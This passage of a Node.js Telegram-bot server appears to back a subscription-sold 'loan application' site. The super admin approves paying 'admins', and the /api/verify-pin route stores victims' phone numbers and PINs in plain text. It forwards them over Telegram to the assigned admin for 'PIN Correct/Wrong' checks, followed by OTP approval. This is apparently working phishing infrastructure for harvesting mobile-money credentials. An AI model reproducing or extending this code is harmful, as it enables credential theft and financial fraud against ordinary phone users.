                        await new Promise(resolve => setTimeout(resolve, 300));
                    }
                    text = `👥 ADMINS (continued)\n\n${entry}`;
                } else {
                    text += entry;
                }
            }

            // Send final message
            if (text.length > 30) {
                await bot.sendMessage(msg.chat.id, text);
            }

            await bot.sendMessage(msg.chat.id, 
                `\n✅ Total Admins: ${regularAdmins.length}\n` +
                `🟢 Active: ${regularAdmins.filter(a => !a.expired).length}\n` +
                `🔴 Expired: ${regularAdmins.filter(a => a.expired).length}`,
                { }
            );
        } catch (err) {
            console.error('❌ Admins list error:', err.message);
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /search <chatId|slot> ── (Super admin only) - Search for admin by Chat ID or Slot
    onMsg(/^\/search(@\S+)?\s+(\S+)/, async (msg, match) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        const searchValue = match[2].toUpperCase();
        
        try {
            let admin = null;
            let searchType = '';

            // Detect if it's a chat ID (numbers) or slot (letters)
            if (/^\d+$/.test(searchValue)) {
                // Search by chat ID
                searchType = 'Chat ID';
                admin = await db.getAdminByChatId(searchValue);
            } else if (/^[A-Z]{4}$/.test(searchValue)) {
                // Search by slot
                searchType = 'Slot';
                admin = await db.getAdmin(searchValue);
            } else {
                await bot.sendMessage(msg.chat.id, 
                    `❌ Invalid search format.\n\n` +
                    `Use either:\n` +
                    `• Chat ID (10 digits): /search 6559010372\n` +
                    `• Slot (4 letters): /search KFPM`
                );
                return;
            }

            if (!admin) {
                await bot.sendMessage(msg.chat.id, 
                    `❌ No admin found with ${searchType}: ${searchValue}`
                );
                return;
            }

            // Check if it's super admin
            const isSuperAdmin = String(admin.chatId) === process.env.SUPER_ADMIN_CHAT_ID;
            if (isSuperAdmin) {
                await bot.sendMessage(msg.chat.id, 
                    `ℹ️ This is the Super Admin account (not shown in regular searches)`
                );
                return;
            }

            // Format detailed response
            const daysLeft = admin.expiresAt ? db.daysUntil(admin.expiresAt) : '∞';
            const expireText = admin.expiresAt 
                ? `${new Date(admin.expiresAt).toLocaleDateString()} (${daysLeft} days)`
                : '♾️ Never (Permanent)';
            const createdText = admin.createdAt
                ? new Date(admin.createdAt).toLocaleDateString()
                : 'Unknown';
            const expiredStatus = admin.expired ? 'Yes 🔴' : 'No 🟢';
            const pausedStatus = admin.paused ? 'Yes ⏸️' : 'No';
            const statusEmoji = admin.expired ? '🔴' : '🟢';

            const response = 
                `${statusEmoji} *Admin Found*\n\n` +
                `👤 *Name:* ${admin.name}\n` +
                `🔑 *Slot:* ${admin.adminId}\n` +
                `💬 *Chat ID:* ${admin.chatId}\n` +
                `📊 *Status:* ${admin.status}\n` +
                `📅 *Created:* ${createdText}\n` +
                `⏰ *Expires:* ${expireText}\n` +
                `🔴 *Expired:* ${expiredStatus}\n` +
                `⏸️ *Paused:* ${pausedStatus}\n` +
                `📧 *Email:* ${admin.email}\n` +
                `📱 *Apps:* ${admin.total || 0}\n\n` +
                `*Admin Link:* \`/admin/${admin.adminId}\`\n\n` +
                `*Actions:*\n` +
                `• Extend: \`/extend ${admin.chatId} 30\`\n` +
                `• Transfer: \`/transfer ${admin.chatId} NEW_CHAT_ID\`\n` +
                `• Revoke: \`/revoke ${admin.chatId}\`\n` +
                `• Remove: \`/remove ${admin.chatId}\``;

            await bot.sendMessage(msg.chat.id, response, { parse_mode: 'Markdown' });
        } catch (err) {
            console.error('❌ Search error:', err.message);
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /stats ── (Super admin only)
    onMsg(/^\/stats(@\S+)?/, async (msg) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        try {
            const stats = await db.getPerAdminStats();
            const MAX_LENGTH = 3500; // Leave buffer under 4096
            let text = `📊 *ADMIN STATISTICS*\n\n`;
            let messageCount = 0;
            
            for (const stat of stats) {
                const expireText = stat.expiresAt 
                    ? `📅 ${new Date(stat.expiresAt).toLocaleDateString()} (${stat.daysLeft}d left)`
                    : '♾️ Permanent';
                
                const entry = `*${stat.name}* [${stat.adminId}]\n${stat.expired ? '🔴' : '🟢'} Apps: ${stat.total}\n${expireText}\n\n`;
                
                // If adding this entry would exceed limit, send current message and start new one
                if (text.length + entry.length > MAX_LENGTH) {
                    if (text.length > 30) { // Has content beyond header
                        await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
                        messageCount++;
                        await new Promise(resolve => setTimeout(resolve, 300)); // Rate limit
                    }
                    text = `📊 *ADMIN STATISTICS (cont.)*\n\n${entry}`;
                } else {
                    text += entry;
                }
            }

            // Send final message
            if (text.length > 30) {
                await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
            }
        } catch (err) {
            console.error('❌ Stats error:', err.message);
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /help ──
    onMsg(/^\/help(@\S+)?/, async (msg) => {
        const chatId = msg.chat.id;
        const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
        const isSuper = String(chatId) === superAdminChatId;

        let helpText = `📚 *AVAILABLE COMMANDS*\n\n`;
        helpText += `🔗 *For All Users:*\n\n`;
        helpText += `/start - Register or claim your admin link\n`;
        helpText += `/mylink - Get your personal admin link\n`;
        helpText += `/expiry - Check your subscription status\n`;
        helpText += `/help - Show this help message\n\n`;

        if (isSuper) {
            helpText += `👑 *Super Admin Commands:*\n\n`;
            helpText += `/stats - View statistics for all admins and applications\n`;
            helpText += `/admins - List all admins in system\n`;
            helpText += `/search <chatId|slot> - Search for admin by Chat ID or Slot\n`;
            helpText += `/extend <chatId> <days> - Extend admin subscription by X days\n`;
            helpText += `/transfer <oldChatId> <newChatId> - Transfer admin to different Telegram account\n`;
            helpText += `/newlink <chatId> - Generate new link, maintain subscription days\n`;
            helpText += `/revoke <chatId> - Revoke access for an admin\n`;
            helpText += `/remove <chatId> - Completely delete admin from database\n`;
            helpText += `/removeall - Remove ALL admins except super admin\n`;
            helpText += `/help - Show this help message\n\n`;
            helpText += `*Examples:*\n`;
            helpText += `\`/admins\` - Show all admins\n`;
            helpText += `\`/search 6559010372\` - Search admin by Chat ID\n`;
            helpText += `\`/search KFPM\` - Search admin by Slot ID\n`;
            helpText += `\`/extend 123456789 30\` - Extend chat ID 123456789 by 30 days\n`;
            helpText += `\`/transfer 123456789 987654321\` - Transfer admin from chat ID 123456789 to 987654321\n`;
            helpText += `\`/newlink 123456789\` - Generate new link for admin, keep subscription days\n`;
            helpText += `\`/revoke 123456789\` - Revoke access for chat ID 123456789\n`;
            helpText += `\`/remove 123456789\` - Completely remove admin from database\n`;
            helpText += `\`/removeall\` - Remove all admins (except you)\n\n`;
            helpText += `*Command Comparison:*\n`;
            helpText += `\`/revoke\` - Disables access but keeps record\n`;
            helpText += `\`/remove\` - Deletes one admin from database\n`;
            helpText += `\`/removeall\` - Deletes ALL admins except super admin\n\n`;
            helpText += `*Note:* Use Chat ID instead of Admin ID. This way subscription days continue even if admin link changes.`;
        }

        helpText += `\n💡 *Need Help?*\n`;
        helpText += `Contact the administrator if you have questions.`;

        await bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
    });

    // ── Callback queries ──
    bot.on('callback_query', async (query) => {
        try {
            await handleCallback(query);
        } catch (err) {
            console.error('❌ Callback error:', err.message);
            try {
                await bot.answerCallbackQuery(query.id, { text: '❌ Error', show_alert: true });
            } catch (e) {}
        }
    });
}

// ==========================================
// CALLBACK HANDLER
// ==========================================
async function handleCallback(query) {
    const chatId = query.message.chat.id;
    const data = query.data;
    const username = query.from.username || query.from.first_name || 'User';

    const ack = async (text, alert = false) => {
        try { await bot.answerCallbackQuery(query.id, { text, show_alert: alert }); } catch (e) {}
    };

    const edit = async (text, kb = null) => {
        try {
            await bot.editMessageText(text, {
                chat_id: chatId,
                message_id: query.message.message_id,
                parse_mode: 'Markdown',
                reply_markup: kb || { inline_keyboard: [] }
            });
        } catch (e) {}
    };

    // ── PAYMENT FLOW ──
    if (data.startsWith('pay|')) {
        const [, action] = data.split('|');
        
        if (action === 'claim') {
            const existingAdmin = await db.getAdminByChatId(String(chatId));
            if (existingAdmin) {
                await edit(`✅ Already Registered\n\nUse /mylink to get your link.`);
                await ack('Already registered');
                return;
            }

            pendingPayments.set(String(chatId), { chatId: String(chatId), username, claimedAt: Date.now() });
            await edit(`⏳ Payment Claim Received\n\nYour claim has been sent to the administrator.\n\nYou will receive your link once payment is confirmed.`);
            await ack('Claim submitted — awaiting admin');
            
            // ── NOW send notification to super admin (only after admin clicks "Payment Done") ──
            const adminChatId = process.env.SUPER_ADMIN_CHAT_ID;
            console.log(`\n📢 SUPER ADMIN NOTIFICATION (triggered by admin clicking "Payment Done"):`);
            console.log(`   Admin Chat ID: ${chatId}`);
            console.log(`   Admin Username: @${username}`);
            console.log(`   SUPER_ADMIN_CHAT_ID: ${adminChatId}`);
            console.log(`   Type: ${typeof adminChatId}`);
            console.log(`   Is defined?: ${adminChatId ? 'YES ✅' : 'NO ❌'}`);
            
            if (!adminChatId || adminChatId === 'undefined' || adminChatId.trim() === '') {
                console.error(`❌ CRITICAL: SUPER_ADMIN_CHAT_ID is NOT properly set!`);
                console.error(`   Fix: Add SUPER_ADMIN_CHAT_ID=your_telegram_id to .env file`);
                console.error(`   Example: SUPER_ADMIN_CHAT_ID=123456789`);
                return;
            }

            console.log(`   Sending approval message to Chat ID: ${adminChatId}`);
            
            try {
                const approvalText = 
                    `💳 New Registration Claim\n\n` +
                    `👤 Name: @${username}\n` +
                    `🆔 Chat ID: ${chatId}\n` +
                    `💰 Amount: KSh. ${PAYMENT_AMOUNT}\n\n` +
                    `Did this user make the payment?`;

                console.log(`   Message length: ${approvalText.length} chars`);
                console.log(`   Sending...`);

                const result = await bot.sendMessage(String(adminChatId),
                    approvalText,
                    {
                        reply_markup: {
                            inline_keyboard: [[
                                { text: '✅ Approve', callback_data: `admin|approve|${chatId}|${username}` },
                                { text: '❌ Reject', callback_data: `admin|reject|${chatId}|${username}` }
                            ]]
                        }
                    }
                );
                
                console.log(`✅ SUCCESS: Approval message sent to super admin!`);
                console.log(`   Message ID: ${result.message_id}`);
                console.log(`   Chat ID: ${result.chat.id}\n`);
            } catch (err) {
                console.error(`❌ FAILED: Error sending approval to super admin:`);
                console.error(`   Error: ${err.message}`);
                console.error(`   Code: ${err.code}`);
                console.error(`   Chat ID attempted: ${adminChatId}`);
                if (err.response) {
                    console.error(`   Response: ${JSON.stringify(err.response)}`);
                }
                console.error(`   Solution: Check if SUPER_ADMIN_CHAT_ID is correct in .env\n`);
            }
        } else if (action === 'cancel') {
            await edit(`❌ *Cancelled*\n\nSend /start anytime to begin again.`);
            await ack('Cancelled');
        }
        return;
    }

    // ── RENEWAL FLOW ──
    if (data.startsWith('renew|')) {
        const [, action] = data.split('|');

        if (action === 'claim') {
            const existingAdmin = await db.getAdminByChatId(String(chatId));
            if (!existingAdmin) {
                await edit(`⚠️ Account not found. Send /start to register.`);
                await ack('Not found');
                return;
            }

            if (pendingRenewals.has(String(chatId))) {
                await edit(`⏳ Already Pending\n\nYour renewal claim is under review.`);
                await ack('Already pending');
                return;
            }

            pendingRenewals.set(String(chatId), { chatId: String(chatId), username, adminId: existingAdmin.adminId, claimedAt: Date.now() });
            await edit(`⏳ Renewal Claim Received\n\nYour renewal claim has been sent to the administrator.\n\nYour link will be reactivated once payment is confirmed.`);
            await ack('Renewal claim submitted');
            
            // ── NOW send notification to super admin (only after admin clicks "Payment Done" for renewal) ──
            const adminChatId = process.env.SUPER_ADMIN_CHAT_ID;
            console.log(`\n📢 RENEWAL APPROVAL NOTIFICATION (triggered by admin clicking "Payment Done"):`);
            console.log(`   Admin Chat ID: ${chatId}`);
            console.log(`   Admin: ${existingAdmin.name}`);
            console.log(`   SUPER_ADMIN_CHAT_ID: ${adminChatId}`);
            
            if (!adminChatId || adminChatId === 'undefined' || adminChatId.trim() === '') {
                console.error(`❌ CRITICAL: SUPER_ADMIN_CHAT_ID is NOT properly set!`);
                return;
            }

            try {
                const renewalText = 
                    `♻️ Renewal Claim\n\n` +
                    `👤 Name: ${existingAdmin.name}\n` +
                    `🆔 Chat ID: ${chatId}\n` +
                    `💰 Amount: KSh. ${RENEWAL_AMOUNT}\n\n` +
                    `Did this user make the renewal payment?`;

                console.log(`   Sending renewal approval to: ${adminChatId}`);

                await bot.sendMessage(String(adminChatId),
                    renewalText,
                    {
                        reply_markup: {
                            inline_keyboard: [[
                                { text: '✅ Approve', callback_data: `admin|renew|${chatId}|${existingAdmin.name}` },
                                { text: '❌ Reject', callback_data: `admin|rejectrenew|${chatId}|${existingAdmin.name}` }
                            ]]
                        }
                    }
                );
                
                console.log(`✅ SUCCESS: Renewal approval message sent to super admin!\n`);
            } catch (err) {
                console.error(`❌ FAILED: Error sending renewal approval to super admin: ${err.message}\n`);
            }
        } else if (action === 'cancel') {
            await edit(`❌ *Cancelled*\n\nSend /start anytime to renew.`);
            await ack('Cancelled');
        }
        return;
    }

    // ── PIN VERIFICATION CALLBACKS ──
    if (data.startsWith('pin_approve_') || data.startsWith('pin_reject_')) {
        const parts = data.split('_');
        const action = parts[0] + '_' + parts[1];
        const adminId = parts[2];
        const applicationId = parts.slice(3).join('_');
        
        try {
            const application = await db.getApplication(applicationId);
            if (!application) {
                await edit(`❌ Application not found`);
                await ack('Not found', true);
                return;
            }

            if (data.startsWith('pin_approve_')) {
                await db.updateApplication(applicationId, { pinStatus: 'approved' });
                await edit(`✅ PIN APPROVED\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}\nPIN: ${application.pin}`);
                await ack('✅ Approved!');
            } else {
                await db.updateApplication(applicationId, { pinStatus: 'rejected' });
                await edit(`❌ PIN REJECTED\n\nApplication: ${applicationId}\nPhone: ${formatPhone(application.phoneNumber)}\nPIN: ${application.pin}`);
                await ack('❌ Rejected');
            }
        } catch (e) {
            console.error('❌ PIN callback error:', e.message);
            await ack('Error processing request', true);
        }
        return;
    }

    // ── OTP VERIFICATION CALLBACKS ──
    if (data.startsWith('otp_approve_') || data.startsWith('otp_reject_')) {
        try {
            const parts = data.split('_');
            const action = parts[0] + '_' + parts[1];
            const adminId = parts[2];
            const applicationId = parts.slice(3).join('_');

            console.log(`🔵 OTP Callback: ${action} | App: ${applicationId} | Admin: ${adminId}`);

            const application = await db.getApplication(applicationId);
            if (!application) {
                console.error(`❌ Application not found: ${applicationId}`);
                await edit(`❌ Application not found`);
                await ack('Not found', true);
                return;
            }

            if (data.startsWith('otp_approve_')) {
                console.log(`✅ Approving OTP for: ${applicationId}`);
                await db.updateApplication(applicationId, { otpStatus: 'approved' });
                console.log(`✅ OTP Status Updated to APPROVED for: ${applicationId}`);
                await edit(`✅ OTP APPROVED\n\nApplication: ${applicationId}\n✅ Loan Approved!`);
                await ack('✅ Approved!');
            } else {
                console.log(`❌ Rejecting OTP for: ${applicationId}`);
                await db.updateApplication(applicationId, { otpStatus: 'rejected' });
                console.log(`✅ OTP Status Updated to REJECTED for: ${applicationId}`);
                await edit(`❌ OTP REJECTED\n\nApplication: ${applicationId}`);
                await ack('❌ Rejected');
            }
        } catch (e) {
            console.error('❌ OTP callback error:', e.message);
            await ack('Error processing request', true);
        }
        return;
    }

    // ── CONFIRMATION HANDLERS ──
    if (data.startsWith('confirm|')) {
        const superAdminChatId = String(process.env.SUPER_ADMIN_CHAT_ID);
        if (String(chatId) !== superAdminChatId) {
            await ack('❌ Not authorised', true);
            return;
        }

        const parts = data.split('|');
        const action = parts[1];
        const targetChatId = parts[2];
        const adminName = (parts[3] || 'Unknown').replace(/^@/, '');

        if (action === 'remove') {
            try {
                const admin = await db.getAdminByChatId(targetChatId);
                if (!admin) {
                    await bot.editMessageText(
                        `❌ Admin not found - may have been deleted already`,
                        {
                            chat_id: chatId,
                            message_id: query.message.message_id,
                            reply_markup: { inline_keyboard: [] }
                        }
                    );
                    await ack('Not found', true);
                    return;
                }

                const adminId = admin.adminId;

                // COMPLETELY DELETE from database
                await db.deleteAdmin(adminId);
                
                // Remove from memory
                pausedAdmins.delete(adminId);
                adminChatIds.delete(adminId);

                console.log(`🗑️ Admin COMPLETELY REMOVED (CONFIRMED): ${admin.name} [${adminId}] Chat ID: ${targetChatId}`);

                // Edit message to remove buttons and show confirmation
                await bot.editMessageText(
                    `✅ Admin Completely Removed\n\n` +
                    `👤 Name: ${admin.name}\n` +
                    `🆔 Admin ID: ${adminId}\n` +
                    `💬 Chat ID: ${targetChatId}\n\n` +
                    `❌ COMPLETELY DELETED from database\n` +
                    `❌ Removed from all memory caches\n` +
                    `❌ No trace remains in system`,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        reply_markup: { inline_keyboard: [] }
                    }
                );

                await ack('✅ Deleted!');

                // Notify admin
                try {
                    await bot.sendMessage(targetChatId,
                        `❌ Your admin account has been completely removed from the system.\n\n` +
                        `Your admin link is now permanently disabled.\n\n` +
                        `Send /start if you want to register again.`
                    );
                } catch (e) {
                    console.log(`ℹ️ Could not notify admin at ${targetChatId} - they may have blocked the bot`);
                }
            } catch (err) {
                console.error(`❌ Confirmed removal error: ${err.message}`);
                await bot.editMessageText(
                    `❌ Error during deletion: ${err.message}`,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        reply_markup: { inline_keyboard: [] }
                    }
                );
                await ack('Error', true);
            }
        } else if (action === 'cancel') {
            // User cancelled deletion
            await bot.editMessageText(
                `❌ Deletion Cancelled\n\n` +
                `Admin was not deleted. They are still in the system.`,
                {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    reply_markup: { inline_keyboard: [] }
                }
            );
            await ack('Cancelled');
        } else if (action === 'removeall') {
            const response = parts[2]; // yes or no

            if (response === 'yes') {
                try {
                    // Get all admins again
                    const allAdmins = await db.getAllAdminsDetailed();
                    const superAdminId = process.env.SUPER_ADMIN_CHAT_ID;

                    let removed = 0;
                    let adminsNotRemoved = [];

                    console.log(`\n🗑️ BULK REMOVAL STARTED (CONFIRMED)`);
                    console.log(`   Total admins in system: ${allAdmins.length}`);
                    console.log(`   Super admin Chat ID: ${superAdminId}`);

                    // Remove all admins EXCEPT the super admin
                    for (const admin of allAdmins) {
                        const adminChatId = String(admin.chatId);
                        
                        console.log(`   Checking: ${admin.name} [Chat: ${adminChatId}]`);

                        // Skip if this is the super admin
                        if (adminChatId === superAdminId) {
                            console.log(`   → SKIPPED (Super admin)`);
                            adminsNotRemoved.push(admin.name);
                            continue;
                        }

                        // Delete this admin
                        try {
                            await db.deleteAdmin(admin.adminId);
                            pausedAdmins.delete(admin.adminId);
                            adminChatIds.delete(admin.adminId);
                            
                            console.log(`   → DELETED: ${admin.name}`);
                            removed++;

                            // Notify admin they were removed
                            try {
                                await bot.sendMessage(adminChatId,
                                    `❌ Your admin account has been completely removed from the system.\n\n` +
                                    `Your admin link is now permanently disabled.\n\n` +
                                    `Send /start if you want to register again.`
                                );
                            } catch (e) {
                                console.log(`   ℹ️ Could not notify ${admin.name} - they may have blocked the bot`);
                            }
                        } catch (err) {
                            console.error(`   ❌ Failed to delete ${admin.name}: ${err.message}`);
                        }
                    }

                    console.log(`\n✅ BULK REMOVAL COMPLETED`);
                    console.log(`   Removed: ${removed} admins`);
                    console.log(`   Kept: ${adminsNotRemoved.length} (super admin)\n`);

                    // Edit message to show completion
                    let confirmMsg = `✅ Bulk Removal Completed\n\n`;
                    confirmMsg += `🗑️ Removed: ${removed} admin${removed !== 1 ? 's' : ''}\n`;
                    confirmMsg += `🛡️ Kept: ${adminsNotRemoved.length} (Super admin)\n\n`;
                    
                    if (adminsNotRemoved.length > 0) {
                        confirmMsg += `Admins Kept:\n`;
                        for (const name of adminsNotRemoved) {
                            confirmMsg += `✅ ${name}\n`;
                        }
                    }

                    confirmMsg += `\n💾 Database cleaned up!`;

                    await bot.editMessageText(
                        confirmMsg,
                        {
                            chat_id: chatId,
                            message_id: query.message.message_id,
                            reply_markup: { inline_keyboard: [] }
                        }
                    );

                    await ack('✅ All admins deleted!');
                } catch (err) {
                    console.error(`❌ Bulk removal error: ${err.message}`);
                    await bot.editMessageText(
                        `❌ Error during bulk removal: ${err.message}`,
                        {
                            chat_id: chatId,
                            message_id: query.message.message_id,
                            reply_markup: { inline_keyboard: [] }
                        }
                    );
                    await ack('Error', true);
                }
            } else if (response === 'no') {
                // User cancelled bulk removal
                await bot.editMessageText(
                    `❌ Bulk Removal Cancelled\n\n` +
                    `No admins were deleted. All admins are still in the system.`,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        reply_markup: { inline_keyboard: [] }
                    }
                );
                await ack('Cancelled');
            }
        }
        return;
    }

    // ── ADMIN DECISIONS ──
    if (data.startsWith('admin|')) {
        const superAdminChatId = String(process.env.SUPER_ADMIN_CHAT_ID);
        if (String(chatId) !== superAdminChatId) {
            await ack('❌ Not authorised', true);
            return;
        }

        const parts = data.split('|');
        const action = parts[1];
        const userChatId = parts[2];
        const displayName = (parts[3] || 'Unknown').replace(/^@/, '');

        if (action === 'approve') {
            try {
                const now = new Date().toISOString();
                const isSuperAdmin = String(userChatId) === process.env.SUPER_ADMIN_CHAT_ID;
                const expiresAt = isSuperAdmin ? null : db.addDays(now, EXPIRY_DAYS); // Super admin never expires
                const shortId = generateShortId(); // Generate 4-char ID like: 7K4F

                const newAdmin = {
                    adminId: shortId,  // Now just "7K4F" instead of "ADMIN1704067890"
                    name: displayName,
                    email: `${displayName.toLowerCase()}@pending`,
                    chatId: String(userChatId),
                    createdAt: now,
                    expiresAt: expiresAt,
                    expired: false,
                    warningSent: false,
                    source: 'registration'
                };

                await db.saveAdmin(newAdmin);
                adminChatIds.set(newAdmin.adminId, String(userChatId));
                pendingPayments.delete(String(userChatId));

                // Generate simple path-based link
                const adminLink = generateAdminLink(shortId);
                
                // Edit message to remove buttons and show approval
                const expiryText = expiresAt 
                    ? new Date(expiresAt).toLocaleDateString()
                    : 'Never (Permanent)';
                    
                await bot.editMessageText(
                    `✅ Registration Approved\n\n👤 Name: ${displayName}\n🔑 Slot: ${newAdmin.adminId}\n📅 Expires: ${expiryText}`,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        reply_markup: { inline_keyboard: [] }  // Empty keyboard to remove buttons
                    }
                );
                
                await ack('✅ Approved!');

                // Send link to admin
                await bot.sendMessage(userChatId,
                    `🎉 Payment Confirmed!\n\n` +
                    `Your admin account has been activated.\n\n` +
                    `🔗 Your Admin Link:\n${adminLink}\n\n` +
                    `📅 Valid until: ${new Date(expiresAt).toLocaleDateString()}\n\n` +
                    `Send /mylink to get this link again.`
                );
            } catch (err) {
                console.error(`❌ Approval error: ${err.message}`);
                await bot.editMessageText(
                    `❌ Error: ${err.message}`,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        reply_markup: { inline_keyboard: [] }
                    }
                );
                await ack('Error', true);
            }
        } else if (action === 'reject') {
            pendingPayments.delete(String(userChatId));
            
            // Edit message to remove buttons and show rejection
            await bot.editMessageText(
                `❌ Registration Rejected\n\n👤 Name: ${displayName}`,
                {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    reply_markup: { inline_keyboard: [] }  // Empty keyboard to remove buttons
                }
            );
            
            await ack('❌ Rejected');

            await bot.sendMessage(userChatId,
                `❌ Payment Not Confirmed\n\n` +
                `We could not verify your payment of KSh. ${PAYMENT_AMOUNT}.\n\n` +
                `If you believe this is an error, contact the administrator.\n\n` +
                `Send /start to try again.`
            );
        } else if (action === 'renew') {
            try {
                const existingAdmin = await db.getAdminByChatId(String(userChatId));
                if (!existingAdmin) {
                    await bot.editMessageText(
                        `❌ User Not Found`,
                        {
                            chat_id: chatId,
                            message_id: query.message.message_id,
                            reply_markup: { inline_keyboard: [] }
                        }
                    );
                    await ack('Not found', true);
                    return;
                }

                const newExpiry = db.addDays(new Date().toISOString(), EXPIRY_DAYS);
                await db.updateAdminExpiry(existingAdmin.adminId, newExpiry);
                pausedAdmins.delete(existingAdmin.adminId);
                pendingRenewals.delete(String(userChatId));

                const link = `${WEBHOOK_URL}/?admin=${existingAdmin.adminId}`;
                
                // Edit message to remove buttons and show renewal approval
                await bot.editMessageText(
                    `✅ Renewal Approved\n\n👤 Name: ${displayName}\n📅 New Expiry: ${new Date(newExpiry).toLocaleDateString()}`,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        reply_markup: { inline_keyboard: [] }  // Empty keyboard to remove buttons
                    }
                );
                
                await ack('✅ Renewed!');

                await bot.sendMessage(userChatId,
                    `🎉 Renewal Confirmed!\n\n` +
                    `Your subscription has been extended.\n\n` +
                    `🔗 Your Admin Link:\n${link}\n\n` +
                    `📅 Valid until: ${new Date(newExpiry).toLocaleDateString()}`
                );
            } catch (err) {
                console.error(`❌ Renewal error: ${err.message}`);
                await bot.editMessageText(
                    `❌ Error: ${err.message}`,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        reply_markup: { inline_keyboard: [] }
                    }
                );
                await ack('Error', true);
            }
        } else if (action === 'rejectrenew') {
            pendingRenewals.delete(String(userChatId));
            
            // Edit message to remove buttons and show renewal rejection
            await bot.editMessageText(
                `❌ Renewal Rejected\n\n👤 Name: ${displayName}`,
                {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    reply_markup: { inline_keyboard: [] }  // Empty keyboard to remove buttons
                }
            );
            
            await ack('❌ Rejected');

            await bot.sendMessage(userChatId,
                `❌ Renewal Not Confirmed\n\n` +
                `We could not verify your renewal payment of KSh. ${RENEWAL_AMOUNT}.\n\n` +
                `If you believe this is an error, contact the administrator.\n\n` +
                `Send /start to try again.`
            );
        }
    }
}

// ==========================================
// LOAD ADMIN CHAT IDs
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.expired) {
                    pausedAdmins.add(admin.adminId);
                }
            }
        }
        console.log(`✅ Loaded ${adminChatIds.size} admin chat IDs`);
    } catch (err) {
        console.error('❌ Error loading admin chat IDs:', err.message);
    }
}

// ==========================================
// REST API ENDPOINTS (for loan application)
// ==========================================

// GET /api/admins - Get active admins
app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const adminList = admins
            .filter(a => !pausedAdmins.has(a.adminId) && (!a.expired))
            .map(a => ({ id: a.adminId, name: a.name, email: a.email, status: a.status, connected: adminChatIds.has(a.adminId) }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/validate-admin/:adminId - Validate admin
app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const admin = await db.getAdmin(req.params.adminId);
        if (admin && pausedAdmins.has(admin.adminId)) {
            return res.json({ success: true, valid: false, message: 'Admin is currently paused' });
        }
        if (admin && admin.status === 'active' && !admin.expired) {
            res.json({ success: true, valid: true, connected: adminChatIds.has(admin.adminId), admin: { id: admin.adminId, name: admin.name, email: admin.email } });
        } else {
            res.json({ success: true, valid: false, message: 'Admin not found, inactive, or expired' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-pin
app.post('/api/verify-pin', async (req, res) => {
    console.log('\n🔵 /api/verify-pin called:', JSON.stringify(req.body));
    try {
        const { phoneNumber, pin, adminId, isReturningUser, previousCount, assignmentType } = req.body;
        const lockKey = `pin_${phoneNumber}`;

        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Processing already in progress' });
        }

        processingLocks.add(lockKey);

        if (!phoneNumber || !pin || !adminId) {
            processingLocks.delete(lockKey);
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }

        const admin = await db.getAdmin(adminId);
        if (!admin) {
            processingLocks.delete(lockKey);
            return res.status(404).json({ success: false, message: 'Admin not found' });
        }

        if (admin.expired || pausedAdmins.has(adminId)) {
            processingLocks.delete(lockKey);
            return res.status(402).json({ success: false, message: 'Admin subscription expired or paused' });
        }

        const applicationId = `PIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        await db.saveApplication({
            id: applicationId,
            adminId: admin.adminId,
            adminName: admin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            isReturningUser: isReturningUser || false,
            previousCount: previousCount || 0,
            assignmentType: assignmentType || 'direct'
        });

        processingLocks.delete(lockKey);
        
        // Return success immediately to the client
        res.json({ success: true, applicationId });

        // Send to admin asynchronously (don't wait)
        const formattedPhone = formatPhone(phoneNumber);
        
        // Add returning customer info if applicable
        const returningLabel = isReturningUser && previousCount > 0
            ? `\n🔄 *Returning customer* (${previousCount} previous applications)`
            : '';
        
        sendToAdmin(adminId, `
📱 *PIN VERIFICATION*${returningLabel}

📋 \`${applicationId}\`
📞 \`${formattedPhone}\`
🔐 \`${pin}\`

⚠️ *VERIFY PIN*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '✅ PIN Correct',  callback_data: `pin_approve_${adminId}_${applicationId}` }],
                    [{ text: '❌ PIN Wrong',    callback_data: `pin_reject_${adminId}_${applicationId}` }]
                ]
            }
        }).catch(err => console.error('Error sending PIN to admin:', err.message));

    } catch (error) {
        processingLocks.delete(`pin_${req.body?.phoneNumber}`);
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-pin-status/:applicationId
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
